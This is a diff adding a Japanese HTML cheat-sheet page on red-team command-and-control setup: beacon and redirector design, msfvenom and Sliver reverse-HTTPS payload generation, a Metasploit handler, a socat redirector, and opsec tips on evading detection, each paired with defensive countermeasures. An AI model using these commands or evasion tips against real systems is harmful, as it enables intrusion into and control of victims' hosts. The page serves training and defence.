@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Command &amp; Control — d0me</title>
+<meta name="description" content="C2 の索引。設計・ペイロード生成・リスナー・egress/リダイレクタ・運用痕跡と、対になる検知/対策。">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar"><div class="wrap">
+  <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+  <button class="nav-toggle" aria-label="メニュー">≡</button>
+  <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+</div></header>
+
+<main>
+<section class="sheet-hero"><div class="wrap">
+  <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>肆 · Command &amp; Control</div>
+  <h1><span class="idx">肆</span>Command &amp; Control</h1>
+  <p class="lede">初期アクセス後の指揮統制。設計(リスナー/リダイレクタ/egress)、ペイロード生成、運用時の痕跡と検知までを、公開フレームワーク前提で扱う。実装の武器化ではなく構成と観測点に主眼を置く。
+    <span class="jp">前提: 検証環境。フレームワークは Metasploit / Sliver を想定。丸ごと動く回避チェーンは載せない。</span></p>
+</div></section>
+
+<div class="wrap"><div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#arch">01 設計 / architecture</a></li>
+      <li><a href="#payload">02 ペイロード生成</a></li>
+      <li><a href="#listener">03 リスナー</a></li>
+      <li><a href="#egress">04 egress / redirector</a></li>
+      <li><a href="#opsec">05 運用と痕跡</a></li>
+      <li><a href="#ref">06 参照</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+    <section id="arch" class="reveal">
+      <h2><span class="num">01</span>設計<span class="jp">architecture</span></h2>
+      <p>C2 は「オペレータ ← リダイレクタ ← ビーコン」の三層で考える。オペレータのチームサーバを直接晒さず、前段にリダイレクタ(HTTP/S・DNS)を置いて到達性と匿名性を分離する。検知面はビーコンの周期性・JA3・証明書・DNS 量に現れるため、設計段階で「何が観測されるか」を先に決める。</p>
+      <table>
+        <thead><tr><th>層</th><th>役割</th><th>観測される痕跡</th></tr></thead>
+        <tbody>
+          <tr><td>ビーコン</td><td>被害ホスト上のインプラント</td><td>周期通信・親子プロセス・メモリ特徴</td></tr>
+          <tr><td>リダイレクタ</td><td>前段プロキシ(HTTPS/DNS)</td><td>証明書・JA3/JA3S・ドメイン評価</td></tr>
+          <tr><td>チームサーバ</td><td>オペレータ側の制御</td><td>(直接晒さない)</td></tr>
+        </tbody>
+      </table>
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>ビーコンの周期性(jitter を除いた規則性)と長寿命セッションをネットワークで検知。</li>
+          <li>新規・低評価ドメインへの外向き TLS、異常な JA3/JA3S を相関。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="payload" class="reveal">
+      <h2><span class="num">02</span>ペイロード生成<span class="jp">payloads</span></h2>
+      <p>配送形態(exe / dll / shellcode / スクリプト)は実行文脈と検知面のトレードオフで選ぶ。ディスク実行は静的面、インメモリは動的面が増える(Evasion 巻参照)。ここでは公開ツールの用途整理に留める。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 生シェルコード（検証用・段階的にテスト）</span>
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=<span class="v">$LHOST</span> LPORT=443 -f raw -o beacon.bin
+
+<span class="c"># PE/.NET/スクリプトを position-independent 化</span>
+donut -i input.exe -o loader.bin</code></pre></div>
+      <div class="note"><span class="lbl">tips</span>LHOST は tun0 依存で毎回変わる: <code>$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)</code></div>
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>既知フレームワークの既定スタブ・エクスポート・文字列を静的シグネチャで検知。</li>
+          <li>ASR ルールと WDAC でスクリプト系ステージャ・未署名バイナリの実行を抑止。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="listener" class="reveal">
+      <h2><span class="num">03</span>リスナー<span class="jp">listeners</span></h2>
+      <p>HTTPS を既定にし、証明書とプロファイル(User-Agent・URI・ヘッダ)を正規トラフィックに寄せる。DNS ビーコンは egress が絞られた環境の代替。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Sliver: HTTPS リスナー + ビーコン生成</span>
+sliver &gt; https --lport 443
+sliver &gt; generate beacon --http <span class="v">$C2_HOST</span> --os windows --arch amd64 \
+  --jitter 30 --seconds 60
+
+<span class="c"># Metasploit: reverse_https ハンドラ</span>
+msfconsole -qx "use exploit/multi/handler; \
+  set payload windows/x64/meterpreter/reverse_https; \
+  set LHOST <span class="v">$LHOST</span>; set LPORT 443; run"</code></pre></div>
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>既定 C2 プロファイル(既知 URI・User-Agent・自己署名証明書)をIDS/プロキシで検知。</li>
+          <li>内部→外部 443 のうち、TLS フィンガープリントが一般ブラウザと乖離するものを監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="egress" class="reveal">
+      <h2><span class="num">04</span>egress / リダイレクタ<span class="jp">到達性の分離</span></h2>
+      <p>チームサーバを直接晒さないため、前段にリダイレクタを置く。HTTP/S は socat / nginx、DNS は権威委任で構成する。ドメイン評価とカテゴリが検知の分かれ目になる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 単純な TCP リダイレクタ（検証）</span>
+socat TCP4-LISTEN:443,fork,reuseaddr TCP4:<span class="v">$TEAMSERVER</span>:443</code></pre></div>
+      <div class="note warn"><span class="lbl">注意</span>ドメインフロンティングは多くの CDN で対策済み。成立可否は環境依存で、恒常的手段として当てにしない。</div>
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>SNI とホストヘッダの不一致、CDN 経由の異常な宛先を検知。</li>
+          <li>DNS の異常(高頻度 TXT/NULL、長いサブドメイン、エントロピー高)を監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="opsec" class="reveal">
+      <h2><span class="num">05</span>運用と痕跡<span class="jp">opsec</span></h2>
+      <ul>
+        <li><strong>周期性を崩す</strong> — jitter を入れ、規則的ビーコンの検知を避ける。</li>
+        <li><strong>プロセス系譜</strong> — office→cmd→powershell のような不自然な親子連鎖を作らない。</li>
+        <li><strong>最小限の常駐</strong> — 不要な永続化・多重セッションは痕跡と検知面を増やす。</li>
+      </ul>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>C2 は三層(ビーコン/リダイレクタ/チームサーバ)で設計し、晒す面を最小化する。</li>
+          <li>検知はビーコンの周期性・TLS フィンガープリント・DNS 量に出る。設計段階で観測点を決める。</li>
+          <li>既定プロファイルはそのまま署名対象。URI・UA・証明書を正規化しないと即バレる。</li>
+          <li>ドメインフロンティングは環境依存で恒久策にならない。egress 監視が防御側の要。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="ref" class="reveal">
+      <h2><span class="num">06</span>参照<span class="jp">References</span></h2>
+      <ul>
+        <li>Sliver — <a href="https://sliver.sh/docs" target="_blank" rel="noopener">sliver.sh/docs</a></li>
+        <li>Metasploit — <a href="https://docs.metasploit.com" target="_blank" rel="noopener">docs.metasploit.com</a></li>
+        <li>donut — <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener">github.com/TheWover/donut</a></li>
+        <li>MITRE ATT&amp;CK — Command and Control (TA0011) — <a href="https://attack.mitre.org/tactics/TA0011/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+      </ul>
+    </section>
+  </article>
+</div></div>
+</main>
+
+<footer class="foot"><div class="wrap">
+  <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Command &amp; Control</span></div>
+  <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>github</a></div>
+  <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+</div></footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
